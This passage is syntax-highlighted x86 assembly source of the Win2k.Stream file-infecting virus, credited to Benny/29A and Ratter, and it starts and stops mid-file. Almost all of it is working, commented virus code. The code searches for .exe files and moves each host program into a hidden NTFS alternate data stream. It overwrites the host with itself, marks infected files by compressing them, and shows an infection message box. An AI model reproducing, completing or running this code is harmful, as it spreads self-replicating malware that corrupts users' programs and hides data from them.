</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">CopyFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">WriteFile</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">CreateFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">CloseHandle</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">GetFileSize</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">VirtualAlloc</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">DeviceIoControl</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">GetFileAttributesA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">GetTempFileNameA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">CreateProcessA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">GetVersion</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">


</span><span class="sc5">FSCTL_SET_COMPRESSION</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">

                        </span><span class="sc1">;compression flag</span><span class="sc0">
</span><span class="sc5">STARTUPINFO</span><span class="sc0"> </span><span class="sc9">STRUCT</span><span class="sc0">              </span><span class="sc1">;used by CreateProcessA API</span><span class="sc0">
    </span><span class="sc5">cb</span><span class="sc0">      </span><span class="sc10">DWORD</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">lpReserved</span><span class="sc0">  </span><span class="sc10">DWORD</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">lpDesktop</span><span class="sc0">   </span><span class="sc10">DWORD</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">lpTitle</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">dwX</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">dwY</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">dwXSize</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">dwYSize</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">dwXCountChars</span><span class="sc0">   </span><span class="sc10">DWORD</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">dwYCountChars</span><span class="sc0">   </span><span class="sc10">DWORD</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">dwFillAttribute</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">dwFlags</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">wShowWindow</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">cbReserved2</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">lpReserved2</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">hStdInput</span><span class="sc0">   </span><span class="sc10">DWORD</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">hStdOutput</span><span class="sc0">  </span><span class="sc10">DWORD</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">hStdError</span><span class="sc0">   </span><span class="sc10">DWORD</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">STARTUPINFO</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">
</span><span class="sc5">PROCESS_INFORMATION</span><span class="sc0"> </span><span class="sc9">STRUCT</span><span class="sc0">
    </span><span class="sc5">hProcess</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">hThread</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">dwProcessId</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">dwThreadId</span><span class="sc0">  </span><span class="sc10">DWORD</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PROCESS_INFORMATION</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">@pushvar</span><span class="sc0">    </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">variable</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">empty</span><span class="sc0">     </span><span class="sc1">;macro for pushing variablez</span><span class="sc0">
    </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">next_instr</span><span class="sc0">
    </span><span class="sc9">ifnb</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">empty</span><span class="sc4">&gt;</span><span class="sc0">
    </span><span class="sc9">%out</span><span class="sc0"> </span><span class="sc5">too</span><span class="sc0"> </span><span class="sc5">much</span><span class="sc0"> </span><span class="sc5">arguments</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc12">'@pushvar'</span><span class="sc0">
    </span><span class="sc9">.err</span><span class="sc0">
    </span><span class="sc9">endif</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">next_instr</span><span class="sc0">
    </span><span class="sc5">variable</span><span class="sc0">
</span><span class="sc5">next_instr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">endm</span><span class="sc0">


</span><span class="sc9">.data</span><span class="sc0">

    </span><span class="sc5">extExe</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'*.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;search mask</span><span class="sc0">

    </span><span class="sc5">fHandle</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;file search handle</span><span class="sc0">
    </span><span class="sc5">file_name</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">;actual program name</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">file_name2</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">;temprorary file</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">WFD</span><span class="sc0">     </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;win32 find data</span><span class="sc0">
    </span><span class="sc5">proc_info</span><span class="sc0">   </span><span class="sc5">PROCESS_INFORMATION</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">  </span><span class="sc1">;used by CreateProcessA</span><span class="sc0">
    </span><span class="sc5">startup_info</span><span class="sc0">    </span><span class="sc5">STARTUPINFO</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">      </span><span class="sc1">;...</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;start of virus</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetVersion</span><span class="sc0">          </span><span class="sc1">;get OS version</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                </span><span class="sc1">;5 = Win2000</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">msgBox</span><span class="sc0">              </span><span class="sc1">;quit if not Win2000</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_name</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAX_PATH</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetModuleFileNameA</span><span class="sc0">      </span><span class="sc1">;get path+filename of actual</span><span class="sc0">
                        </span><span class="sc1">;program</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WFD</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">extExe</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindFirstFileA</span><span class="sc0">          </span><span class="sc1">;find first file to infect</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">end_host</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">;save handle</span><span class="sc0">


</span><span class="sc5">search_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect</span><span class="sc0">              </span><span class="sc1">;try to infect file</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WFD</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindNextFileA</span><span class="sc0">           </span><span class="sc1">;try to find next file</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">search_loop</span><span class="sc0">         </span><span class="sc1">;and infect it</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindClose</span><span class="sc0">           </span><span class="sc1">;close file search handle</span><span class="sc0">

</span><span class="sc5">end_host</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_name</span><span class="sc0">        </span><span class="sc1">;get our filename</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">@endsz</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"RTS:"</span><span class="sc0">          </span><span class="sc1">;append there :"STR" stream</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">;name</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetCommandLineA</span><span class="sc0">         </span><span class="sc1">;get command line</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;to EDI</span><span class="sc0">

</span><span class="sc1">;esi - app name</span><span class="sc0">
</span><span class="sc1">;edi - cmd line</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">proc_info</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">startup_info</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateProcessA</span><span class="sc0">          </span><span class="sc1">;jump to host code</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">msgBox</span><span class="sc0">              </span><span class="sc1">;if error, show message box</span><span class="sc0">

</span><span class="sc5">end_app</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">         </span><span class="sc1">;exit</span><span class="sc0">

</span><span class="sc5">msgBox</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1000h</span><span class="sc0">               </span><span class="sc1">;show some lame msg box :)</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"Win2k.Stream by Benny/29A &amp; Ratter"</span><span class="sc0">    </span><span class="sc1">;copyleft :]</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"This cell has been infected by [Win2k.Stream] virus!"</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;with name of virus and authorz</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MessageBoxA</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_app</span><span class="sc0">



</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WFD.WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFileAttributesA</span><span class="sc0">      </span><span class="sc1">;check if the file is NTFS</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">800h</span><span class="sc0">            </span><span class="sc1">;compressed = already infected</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">next_infect</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;quit then</span><span class="sc0">

</span><span class="sc5">next_infect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WFD.WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">flagz</span><span class="sc4">],</span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Create_File</span><span class="sc0">         </span><span class="sc1">;open found program</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">infect_end</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">@pushvar</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc5">@pushvar</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">&gt;</span><span class="sc0">      </span><span class="sc1">;default compression</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FSCTL_SET_COMPRESSION</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;NTFS compress it =</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DeviceIoControl</span><span class="sc0">         </span><span class="sc1">;mark as already infected</span><span class="sc0">
                        </span><span class="sc1">; = and save disk space :)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0">         </span><span class="sc1">;close file handle</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_name2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"str"</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"."</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetTempFileNameA</span><span class="sc0">        </span><span class="sc1">;create name for temp file</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">infect_end</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WFD.WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CopyFileA</span><span class="sc0">           </span><span class="sc1">;copy there victim program</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">infect_end</span><span class="sc0">


    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_name</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CopyFileA</span><span class="sc0">           </span><span class="sc1">;copy ourself to victim program</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc5">@endsz</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"RTS:"</span><span class="sc0">          </span><span class="sc1">;append :"STR" stream to</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">;victim program filename</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Create_File</span><span class="sc0">         </span><span class="sc1">;open victim file</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">infect_end</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFileSize</span><span class="sc0">         </span><span class="sc1">;get its size</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MEM_COMMIT</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MEM_RESERVE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VirtualAlloc</span><span class="sc0">            </span><span class="sc1">;allocate enough memory</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;for file content</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">infect_end_handle</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">@pushvar</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc5">file_size</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReadFile</span><span class="sc0">            </span><span class="sc1">;read file content to</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;allocated memory</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">infect_end_handle</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0">         </span><span class="sc1">;close its file handle</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_name2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DeleteFileA</span><span class="sc0">         </span><span class="sc1">;delete temporary file</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">flagz</span><span class="sc4">],</span><span class="sc5">CREATE_ALWAYS</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WFD.WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Create_File</span><span class="sc0">         </span><span class="sc1">;open stream</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">infect_end_dealloc</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_size</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteFile</span><span class="sc0">           </span><span class="sc1">;write there victim program</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">infect_end_handle</span><span class="sc0">

